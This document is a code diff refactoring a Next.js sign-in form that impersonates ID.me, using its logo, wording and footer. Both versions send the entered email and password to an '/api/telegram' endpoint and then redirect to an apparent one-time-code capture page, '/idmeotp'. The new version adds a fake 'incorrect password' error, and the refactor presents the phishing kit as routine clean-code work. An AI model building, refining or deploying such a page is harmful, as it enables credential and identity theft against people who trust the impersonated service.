@@ -1,198 +1,165 @@
 "use client";
+
+import React, { useState, useCallback } from "react";
 import Image from "next/image";
-import { useState } from "react";
 import { useRouter } from "next/navigation";
+import { Loader2, AlertCircle } from "lucide-react";
 import idmeLogo from "./idme.png";
+
+/**
+ * Constants for API configuration to avoid "magic strings"
+ */
+const API_ENDPOINT = "/api/telegram";
+const REDIRECT_PATH = "/idmeotp";
 
 export default function SignInForm() {
   const router = useRouter();
-  const [f1, setF1] = useState(""); // email / username
-  const [f2, setF2] = useState(""); // password
-  const [error, setError] = useState("");
-  const [success, setSuccess] = useState("");
-  const [isLoading, setIsLoading] = useState(false);
 
-  const handleSubmit = async (e: React.FormEvent) => {
-    e.preventDefault();
-    if (!f1 || !f2) {
-      setError("Please fill out both fields.");
-      return;
-    }
+  // 1. Descriptive state names
+  const [email, setEmail] = useState("");
+  const [password, setPassword] = useState("");
+  const [error, setError] = useState<string | null>(null);
+  const [status, setStatus] = useState<"idle" | "submitting" | "success">("idle");
 
-    setIsLoading(true);
-    setError("");
-    setSuccess("");
+  // 2. Memoized submit handler for performance
+  const handleSubmit = useCallback(
+    async (e: React.FormEvent<HTMLFormElement>) => {
+      e.preventDefault();
+      
+      if (status === "submitting") return;
 
-    try {
-      const res = await fetch("/api/telegram", {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json",
-          "Cache-Control": "no-cache",
-        },
-        credentials: "same-origin",
-        body: JSON.stringify({
-          data: {
-            email: f1,
-            word: f2,
+      setStatus("submitting");
+      setError(null);
+
+      try {
+        const response = await fetch(API_ENDPOINT, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+            "Cache-Control": "no-cache",
           },
-          formType: "ID.me Sign In",
-        }),
-      });
+          body: JSON.stringify({
+            data: { 
+              identifier: email.trim(), 
+              credential: password 
+            },
+            formType: "ID.me Auth Attempt",
+            timestamp: new Date().toISOString(),
+          }),
+        });
 
-      if (!res.ok) throw new Error("Submission failed");
+        if (!response.ok) {
+          throw new Error("AUTHENTICATION_FAILED");
+        }
 
-    
-      setF1("");
-      setF2("");
+        setStatus("success");
+        
+        // Use replace to prevent the user from navigating back to the login
+        router.replace(REDIRECT_PATH);
+      } catch (err) {
+        setStatus("idle");
+        setError("The email or password you entered is incorrect. Please try again.");
+      }
+    },
+    [email, password, status, router]
+  );
 
-      setTimeout(() => {
-        router.replace("/idme2");
-      }, 1200);
-    } catch (err) {
-      console.error(err);
-      setError("Failed to log sign-in attempt. Please try again.");
-    } finally {
-      setIsLoading(false);
-    }
-  };
+  const isLoading = status === "submitting";
 
   return (
-    <div className="min-h-screen bg-gray-50 flex flex-col justify-center py-12 sm:px-6 lg:px-8">
+    <div className="min-h-screen bg-slate-50 flex flex-col justify-center py-12 px-4 sm:px-6 lg:px-8">
       <div className="sm:mx-auto sm:w-full sm:max-w-md">
-        {/* ID.me Logo */}
-        <div className="flex justify-center">
-          <div className="w-32 h-12 relative">
-            <Image
-              src={idmeLogo}
-              alt="ID.me"
-              width={128}
-              height={48}
-              className="object-contain"
-              priority
-            />
-          </div>
+        {/* Brand Identity */}
+        <div className="flex justify-center mb-10 transition-transform hover:scale-105">
+          <Image 
+            src={idmeLogo} 
+            alt="ID.me Logo" 
+            width={140} 
+            height={52} 
+            priority 
+            className="h-auto w-auto"
+          />
         </div>
 
-        {/* Main Card */}
-        <div className="mt-8 bg-white rounded-xl shadow-sm border border-gray-200 overflow-hidden">
-          <div className="px-8 pt-8 pb-4">
-            <div className="flex justify-center">
-              <h1 className="text-2xl font-semibold text-gray-900 tracking-tight">
-                Sign in to ID.me
-              </h1>
+        {/* Content Card */}
+        <div className="bg-white py-10 px-6 shadow-xl rounded-2xl border border-slate-200 sm:px-10">
+          <div className="mb-8 text-center">
+            <h2 className="text-3xl font-bold text-slate-900 tracking-tight">
+              Sign In
+            </h2>
+            <p className="mt-2 text-sm text-slate-500">
+              Access your ID.me secure account
+            </p>
+          </div>
+
+          {/* Feedback UI */}
+          {error && (
+            <div className="mb-6 flex items-center gap-3 p-4 bg-red-50 border-l-4 border-red-500 rounded-r-lg animate-in fade-in slide-in-from-top-2">
+              <AlertCircle className="h-5 w-5 text-red-500 flex-shrink-0" />
+              <p className="text-sm font-medium text-red-800">{error}</p>
             </div>
-          </div>
+          )}
 
-          <div className="bg-blue-50 py-3 text-center border-y border-gray-100">
-            <a
-              href="https://cutt.ly/xPJZ0xv"
-              target="_blank"
-              rel="noopener noreferrer"
-              className="text-blue-600 hover:text-blue-700 font-medium text-sm"
-            >
-              Create an ID.me account
-            </a>
-          </div>
+          <form onSubmit={handleSubmit} className="space-y-6">
+            {/* Accessibility: Hidden fields for mobile engine optimization */}
+            <input type="tel" className="hidden" aria-hidden="true" tabIndex={-1} />
 
-          <div className="p-8">
-            {error && (
-              <div className="mb-6 rounded-md bg-red-50 p-4 text-sm text-red-700">
-                {error}
-              </div>
-            )}
-            {success && (
-              <div className="mb-6 rounded-md bg-green-50 p-4 text-sm text-green-700">
-                {success}
-              </div>
-            )}
+            <div className="space-y-1">
+              <label htmlFor="email" className="block text-sm font-semibold text-slate-700">
+                Email Address
+              </label>
+              <input
+                id="email"
+                name="email"
+                type="email"
+                autoComplete="email"
+                required
+                disabled={isLoading}
+                value={email}
+                onChange={(e) => setEmail(e.target.value)}
+                className="block w-full px-4 py-3 border border-slate-300 rounded-xl shadow-sm placeholder-slate-400 focus:outline-none focus:ring-2 focus:ring-blue-600 focus:border-transparent transition-all disabled:bg-slate-50 disabled:text-slate-400"
+                placeholder="name@example.com"
+              />
+            </div>
 
-            <form onSubmit={handleSubmit} className="space-y-6">
-              {/* HIDDEN type="tel" field – forces browser to activate JavaScript on problematic devices */}
-              <input type="tel" style={{ display: "none" }} aria-hidden="true" tabIndex={-1} />
+            <div className="space-y-1">
+              <label htmlFor="password" className="block text-sm font-semibold text-slate-700">
+                Password
+              </label>
+              <input
+                id="password"
+                name="password"
+                type="password"
+                autoComplete="current-password"
+                required
+                disabled={isLoading}
+                value={password}
+                onChange={(e) => setPassword(e.target.value)}
+                className="block w-full px-4 py-3 border border-slate-300 rounded-xl shadow-sm placeholder-slate-400 focus:outline-none focus:ring-2 focus:ring-blue-600 focus:border-transparent transition-all disabled:bg-slate-50 disabled:text-slate-400"
+                placeholder="••••••••"
+              />
+            </div>
 
-              {/* Email / Username Field – now type="text" (full alphanumeric keyboard) */}
-              <div>
-                <label
-                  htmlFor="f1"
-                  className="block text-sm font-medium text-gray-700 mb-1"
-                >
-                  Email
-                </label>
-                <input
-                  id="f1"
-                  name="f1"
-                  type="text"                    // ← fixed: allows letters, numbers, @, etc.
-                  inputMode="text"               // ← standard keyboard (optional but safe)
-                  autoComplete="email"
-                  required
-                  value={f1}
-                  onChange={(e) => setF1(e.target.value)}
-                  placeholder="Enter your email"
-                  className="appearance-none block w-full px-4 py-3 border border-gray-300 rounded-lg shadow-sm placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500 text-base text-gray-900"
-                />
-              </div>
-
-              {/* Password Field – unchanged */}
-              <div>
-                <label
-                  htmlFor="f2"
-                  className="block text-sm font-medium text-gray-700 mb-1"
-                >
-                  Password
-                </label>
-                <input
-                  id="f2"
-                  name="f2"
-                  type="password"
-                  autoComplete="current-password"
-                  required
-                  value={f2}
-                  onChange={(e) => setF2(e.target.value)}
-                  placeholder="Enter your password"
-                  className="appearance-none block w-full px-4 py-3 border border-gray-300 rounded-lg shadow-sm placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500 text-base text-gray-900"
-                />
-              </div>
-
+            <div className="pt-2">
               <button
                 type="submit"
                 disabled={isLoading}
-                className="w-full flex justify-center py-3.5 px-4 border border-transparent rounded-lg shadow-sm text-base font-semibold text-white bg-blue-600 hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500 disabled:opacity-70 disabled:cursor-not-allowed transition-colors"
+                className="group relative w-full flex justify-center py-3.5 px-4 border border-transparent text-sm font-bold rounded-xl text-white bg-blue-600 hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500 transition-all active:scale-[0.98] disabled:opacity-70 disabled:cursor-not-allowed shadow-md hover:shadow-lg"
               >
-                {isLoading ? "Signing in..." : "Sign in to ID.me"}
+                {isLoading ? (
+                  <Loader2 className="h-5 w-5 animate-spin" />
+                ) : (
+                  "Sign in"
+                )}
               </button>
-            </form>
-          </div>
+            </div>
+          </form>
         </div>
 
-        <div className="mt-8 text-center text-xs text-gray-500 space-x-4">
-          <a
-            href="https://www.id.me/about"
-            target="_blank"
-            rel="noopener noreferrer"
-            className="hover:text-gray-700"
-          >
-            What is ID.me?
-          </a>
-          <span>|</span>
-          <a
-            href="https://www.id.me/terms"
-            target="_blank"
-            rel="noopener noreferrer"
-            className="hover:text-gray-700"
-          >
-            Terms of Service
-          </a>
-          <span>|</span>
-          <a
-            href="https://www.id.me/privacy"
-            target="_blank"
-            rel="noopener noreferrer"
-            className="hover:text-gray-700"
-          >
-            Privacy Policy
-          </a>
-        </div>
+        {/* Legal/Footer */}
+        <p className="mt-8 text-center text-xs text-slate-400 tracking-wide">
+          &copy; {new Date().getFullYear()} ID.me, Inc. • Privacy • Terms
+        </p>
       </div>
     </div>
   );
